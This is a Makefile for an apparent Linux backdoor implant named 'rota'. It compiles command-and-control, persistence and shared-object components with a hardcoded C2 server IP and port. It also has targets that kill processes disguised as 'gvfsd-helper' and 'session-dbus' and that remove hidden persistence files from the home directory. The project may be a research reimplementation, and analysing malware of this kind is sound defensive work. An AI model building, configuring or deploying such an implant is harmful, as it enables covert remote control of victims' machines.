CC=gcc

FLAGS=-ggdb -Wno-infinite-recursion -Wall -lpthread -pthread

#update Makefile here
C2_SERVER='"10.120.154.199"'
C2_PORT=1443

all: debug release so

bins:
	mkdir -p ./bins/

debug: bins
#$(CC) $(FLAGS) -DC2_SERVER=$(C2_SERVER) -DC2_PORT=$(C2_PORT) -I ./inc/ $(wildcard ./src/*.c) -ldl -o ./bin/rota
	$(CC) $(FLAGS) -DDEBUG -DC2_SERVER=$(C2_SERVER) -DC2_PORT=$(C2_PORT) -I ./inc/ ./src/c2_commands.c ./src/c2_loop.c ./src/persistence.c ./src/utils.c  ./src/main.c -ldl -o ./bins/rota-debug

release: bins
	$(CC) $(FLAGS) -s -DC2_SERVER=$(C2_SERVER) -DC2_PORT=$(C2_PORT) -I ./inc/ ./src/c2_commands.c ./src/c2_loop.c ./src/persistence.c ./src/utils.c  ./src/main.c -ldl -o ./bins/rota-release

so: bins
	$(CC) -fpic -shared ./src/so.c -o ./bins/soexec.so

kill:
	pkill gvfsd-helper
	pkill session-dbus

clean:
	rm -rf ~/.config/au-tostart
	rm -rf ~/.gvfsd 	# Persistence file location
	rm -rf ~/.dbus		# Persistence file location
#rm -rf ~/.bashrc 	# Persistence file
	rm -rf ./bins 		# Local bins
	rm -rf ~/.X11 		# Lock files
	ipcrm -M 0x0064b2e2 # Shared memory

